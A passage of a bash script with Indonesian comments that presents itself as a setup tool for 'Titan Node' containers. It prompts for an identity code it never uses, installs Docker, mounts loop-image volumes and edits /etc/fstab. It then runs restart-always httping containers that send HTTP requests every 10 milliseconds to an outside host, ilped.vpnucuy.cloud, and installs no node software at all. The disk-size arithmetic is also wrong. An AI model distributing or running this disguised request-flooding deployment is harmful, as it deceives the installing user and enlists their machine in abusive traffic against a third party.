fi
echo "=======================Titan Node======================="
# Baca dan muat Informasi kode identitas
read -p "Masukkan kode identitas anda: " id
# Biarkan pengguna memasukkan jumlah container yang ingin dibuat
read -p "Silakan masukkan jumlah node yang ingin dibuat. Satu IP dibatasi maksimal 5 node: " container_count
# Biarkan pengguna memasukkan batas ukuran hard disk setiap node (dalam GB)
read -p "Silakan masukkan batas ukuran hard disk setiap node (dalam GB, misalnya: 1 mewakili 1GB, 2 mewakili 2GB) : " disk_size_gb
# Tanyakan direktori penyimpanan volume data pengguna, dan tetapkan nilai default
read -p "Silahkan masukkan direktori penyimpanan volume data [default: /mnt/docker_volumes]: " volume_dir
volume_dir=${volume_dir:-/mnt/docker_volumes}
apt update
# Periksa apakah Docker telah diinstal Instal
if ! command -v docker &> /dev/null
then
    echo "Docker tidak terdeteksi, sedang menginstal. .."
    apt-get install ca-certificates curl gnupg lsb-release
    # Instal versi terbaru Docker
    apt-get install docker.io -y
else
    echo "Docker telah diinstal."
fi
# Tarik gambar Docker
docker pull bretfisher/httping
# Buat direktori penyimpanan file gambar
mkdir -p $volume_dir
# Buat jumlah container yang ditentukan pengguna
for i in $(seq 1 $container_count)
do
    disk_size_mb=$((disk_size_gb * 32))
    # Buat sistem file gambar dengan ukuran tertentu untuk setiap kontainer
    volume_path="$volume_dir/volume_$i.img"
    sudo dd if=/dev/zero of=$volume_path bs=1M count=$disk_size_mb
    sudo mkfs.ext4 $volume_path
    # Buat direktori dan pasang sistem berkas
    mount_point="/mnt/my_volume_$i"
    mkdir -p $mount_point
    sudo mount -o loop $volume_path $mount_point
    # Akan dipasang Tambahkan informasi ke /etc/fstab
    echo "$volume_path $mount_point ext4 loop,defaults 0 0" | sudo tee -a /etc/fstab
    # Jalankan container dan setel kebijakan mulai ulang ke selalu
    container_id=$(docker run --restart always bretfisher/httping)
    echo "node titan$i telah memulai ID containe $container_id"
    sleep 10
    # Masuk ke container dan lakukan pengikatan dan perintah lainnya
    docker exec -it $container_id bash -c "\
        httping -i 0.01 -G -q -F http://ilped.vpnucuy.cloud"
done
echo "==============================Semua node sudah diatur dan dimulai===================================."
